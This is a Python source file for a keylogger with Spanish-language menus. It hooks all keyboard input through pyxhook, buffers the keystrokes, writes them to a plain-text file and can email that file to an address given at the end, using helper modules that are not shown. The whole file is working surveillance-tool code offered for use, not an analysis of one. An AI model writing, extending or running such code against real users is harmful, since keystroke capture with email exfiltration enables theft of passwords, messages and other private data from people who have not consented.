
import time
import sys
import pyxhook

from keylogger_core import KeyloggerCore
from file_manager import guardar_en_archivo
from email_handler import enviar_email


def mostrar_menu() -> (bool, bool):
    print("============= Configuración del keylogger =============")
    print("Responde 'yes'/'y' para SÍ, 'no'/'n' para NO, o 'exit' para salir.\n")

    while True:
        resp = input("¿Deseas enviar los registros por correo? (yes/y / no/n / exit): ").strip().lower()
        if resp == 'exit':
            sys.exit(0)
        elif resp in ('yes', 'y'):
            enviar = True
            break
        elif resp in ('no', 'n'):
            enviar = False
            break
        else:
            print("Entrada inválida. Ingresa yes/y, no/n o exit.\n")

    while True:
        resp = input("¿Deseas guardar los registros en texto plano? (yes/y / no/n / exit): ").strip().lower()
        if resp == 'exit':
            sys.exit(0)
        elif resp in ('yes', 'y'):
            guardar = True
            break
        elif resp in ('no', 'n'):
            guardar = False
            break
        else:
            print("Entrada inválida. Ingresa yes/y, no/n o exit.\n")

    if not enviar and not guardar:
        print("No se van a enviar ni guardar registros. Finalizando ejecución.")
        sys.exit(0)

    print()
    return enviar, guardar


def main():
    enviar, guardar = mostrar_menu()
    logger = KeyloggerCore(enviar_correo=enviar, guardar_local=guardar)

    hookman = pyxhook.HookManager()
    hookman.KeyDown = logger.callback
    hookman.HookKeyboard()
    hookman.start()

    try:
        while logger.running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n[x] Interrupción manual (Ctrl+C).")
    finally:
        hookman.cancel()

        print()

        if guardar:
            archivo_generado = guardar_en_archivo(logger.buffer)
        else:
            archivo_generado = "output_temporal.txt"
            try:
                with open(archivo_generado, "w", encoding="utf-8") as f:
                    f.write(logger.buffer)
                print(f"[keylogger] Archivo temporal creado: {archivo_generado}")
            except Exception as e:
                print(f"[keylogger] Error al crear archivo temporal: {e}")
                archivo_generado = None

        if enviar:
            if archivo_generado:
                destinatario = input("Ingresa el correo destinatario: ").strip()
                if "@" in destinatario and "." in destinatario:
                    enviar_email(destinatario, archivo_generado)
                else:
                    print("Correo destinatario no válido. No se envía.")
            else:
                print("No se generó un archivo para adjuntar; no se envía correo.")

        print("\n============= Keylogger finalizado. =============")


if __name__ == "__main__":
    main()
